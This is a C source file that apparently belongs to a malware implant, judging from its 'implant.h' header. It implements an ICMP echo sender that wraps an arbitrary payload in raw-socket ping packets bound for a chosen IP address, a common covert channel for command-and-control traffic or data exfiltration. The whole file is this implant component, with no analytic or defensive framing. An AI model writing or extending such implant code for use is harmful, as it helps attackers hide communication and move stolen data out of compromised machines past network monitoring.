#include "implant.h"

#include <arpa/inet.h>
#include <netinet/ip_icmp.h>
#include <string.h>
#include <sys/socket.h>

typedef struct {
    struct icmphdr hdr;
    uint8_t data[ICMP_DATA_SIZE];
} icmp_packet_t;

static uint16_t
icmp_checksum(const void *buf, size_t len) {
    const uint8_t *ptr = buf;
    uint32_t sum = 0;

    while (len > 1) {
        uint16_t word;
        memcpy(&word, ptr, sizeof(word));
        sum += word;
        ptr += 2;
        len -= 2;
    }

    if (len == 1)
        sum += *ptr;

    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);

    return (uint16_t)(~sum);
}

static void
build_icmp_packet(icmp_packet_t *pkt, const uint8_t *payload, size_t payload_len) {
    static uint16_t seq = 0;

    memset(pkt, 0, sizeof(*pkt));

    pkt->hdr.type = ICMP_ECHO;
    pkt->hdr.code = 0;
    pkt->hdr.un.echo.id = htons((uint16_t)getpid());
    pkt->hdr.un.echo.sequence = htons(seq++);
    pkt->hdr.checksum = 0;

    size_t copy_len = payload_len < ICMP_DATA_SIZE ? payload_len : ICMP_DATA_SIZE;
    memcpy(pkt->data, payload, copy_len);

    pkt->hdr.checksum = icmp_checksum(pkt, sizeof(*pkt));
}

uint8_t
icmp_send(const int8_t *dst_ip, const uint8_t *payload, size_t len) {
    icmp_packet_t packet = {0};
    struct sockaddr_in dest = {0};
    int sockfd;

    if (!dst_ip || !payload)
        return ERROR;

    sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (sockfd < 0) {
#ifdef DEBUG
        DEBUG_LOG("icmp_send: socket creation failed\n");
#endif
        return ERROR;
    }

    dest.sin_family = AF_INET;
    if (inet_pton(AF_INET, (const char *)dst_ip, &dest.sin_addr) != 1) {
#ifdef DEBUG
        DEBUG_LOG("icmp_send: invalid IP address %s\n", dst_ip);
#endif
        close(sockfd);
        return ERROR;
    }

    build_icmp_packet(&packet, payload, len);

    ssize_t sent = sendto(sockfd, &packet, sizeof(packet), 0,
                          (struct sockaddr *)&dest, sizeof(dest));

    close(sockfd);

    if (sent < 0) {
#ifdef DEBUG
        DEBUG_LOG("icmp_send: sendto failed\n");
#endif
        return ERROR;
    }

    return SUCCESSFUL;
}
